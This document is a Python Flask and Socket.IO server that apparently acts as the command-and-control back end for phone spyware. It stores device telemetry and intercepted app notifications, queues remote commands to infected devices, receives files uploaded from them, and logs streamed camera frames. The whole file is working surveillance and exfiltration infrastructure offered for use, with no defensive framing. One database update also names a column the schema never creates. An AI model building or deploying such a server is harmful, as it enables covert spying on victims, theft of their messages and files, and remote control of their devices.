#!/usr/bin/env python3
from flask import Flask, request, jsonify, render_template
from flask_socketio import SocketIO, emit
from datetime import datetime
import json
import sqlite3
import uuid
import os
from threading import Lock

app = Flask(__name__, template_folder='templates')
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, cors_allowed_origins="*")
db_lock = Lock()

UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def init_db():
    conn = sqlite3.connect('c2_data.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS telemetry
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT, device_id TEXT, data TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS notifications
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT, package TEXT, title TEXT, text TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id TEXT PRIMARY KEY, device_id TEXT, command TEXT, args TEXT,
                  issued_at TEXT, status TEXT, result TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS files
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  device_id TEXT, filename TEXT, size INTEGER, uploaded_at TEXT)''')
    conn.commit()
    conn.close()

init_db()

pending_commands = {}
connected_ws = {}

@app.route('/')
def index():
    return render_template('dashboard.html')

@app.route('/api/collect', methods=['POST'])
def collect():
    data = request.json
    device_id = request.remote_addr
    with db_lock:
        conn = sqlite3.connect('c2_data.db')
        c = conn.cursor()
        c.execute("INSERT INTO telemetry (timestamp, device_id, data) VALUES (?, ?, ?)",
                  (datetime.utcnow().isoformat(), device_id, json.dumps(data)))
        conn.commit()
        conn.close()
    print(f"[+] Telemetry from {device_id}")
    return jsonify({"status": "ok"})

@app.route('/api/notification', methods=['POST'])
def notification():
    data = request.json
    with db_lock:
        conn = sqlite3.connect('c2_data.db')
        c = conn.cursor()
        c.execute("INSERT INTO notifications (timestamp, package, title, text) VALUES (?, ?, ?, ?)",
                  (datetime.utcnow().isoformat(), data.get('package'), data.get('title'), data.get('text')))
        conn.commit()
        conn.close()
    print(f"[!] Notification from {data.get('package')}")
    socketio.emit('notification', data)
    return jsonify({"status": "ok"})

@app.route('/api/command/<device_id>', methods=['GET'])
def get_command(device_id):
    cmd = pending_commands.pop(device_id, None)
    if cmd:
        print(f"[>] Sending command {cmd['id']} -> {device_id} : {cmd['command']}")
        return jsonify({"id": cmd['id'], "action": cmd['command'], "args": cmd['args']})
    else:
        return jsonify({"id": "none", "action": "noop", "args": {}})

@app.route('/api/result/<device_id>', methods=['POST'])
def command_result(device_id):
    data = request.json
    cmd_id = data.get('id')
    output = data.get('output')
    with db_lock:
        conn = sqlite3.connect('c2_data.db')
        c = conn.cursor()
        c.execute("UPDATE commands SET status='done', result=?, timestamp_end=? WHERE id=?",
                  (output, datetime.utcnow().isoformat(), cmd_id))
        conn.commit()
        conn.close()
    print(f"[<] Result from {device_id} for {cmd_id}: {output[:100]}")
    return jsonify({"status": "ok"})

@app.route('/api/upload/<device_id>', methods=['POST'])
def upload_file(device_id):
    if 'file' not in request.files:
        return "No file", 400
    file = request.files['file']
    filename = file.filename
    save_path = os.path.join(UPLOAD_FOLDER, f"{device_id}_{filename}")
    file.save(save_path)
    size = os.path.getsize(save_path)
    with db_lock:
        conn = sqlite3.connect('c2_data.db')
        c = conn.cursor()
        c.execute("INSERT INTO files (device_id, filename, size, uploaded_at) VALUES (?,?,?,?)",
                  (device_id, filename, size, datetime.utcnow().isoformat()))
        conn.commit()
        conn.close()
    return jsonify({"status": "ok", "path": save_path})

@app.route('/admin/send_command', methods=['POST'])
def send_command():
    data = request.json
    device_id = data.get('device_id')
    command = data.get('command')
    args = data.get('args', {})
    cmd_id = str(uuid.uuid4())
    pending_commands[device_id] = {
        "id": cmd_id,
        "command": command,
        "args": args
    }
    with db_lock:
        conn = sqlite3.connect('c2_data.db')
        c = conn.cursor()
        c.execute("INSERT INTO commands (id, device_id, command, args, issued_at, status) VALUES (?,?,?,?,?,?)",
                  (cmd_id, device_id, command, json.dumps(args), datetime.utcnow().isoformat(), 'pending'))
        conn.commit()
        conn.close()
    return jsonify({"status": "queued", "command_id": cmd_id})

@socketio.on('connect')
def handle_connect():
    device_id = request.args.get('device_id')
    if device_id:
        connected_ws[device_id] = request.sid
        emit('connected', {'msg': f'Device {device_id} connected'})

@socketio.on('disconnect')
def handle_disconnect():
    for device_id, sid in list(connected_ws.items()):
        if sid == request.sid:
            del connected_ws[device_id]
            break

@socketio.on('stream')
def handle_stream(data):
    # data is base64 encoded JPEG frame from camera
    # Broadcast to all admins or just store; here we simply log
    print("Received camera frame (length: {})".format(len(data) if data else 0))
    # optionally re-emit to a different room
    # emit('camera_frame', data, broadcast=True)

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
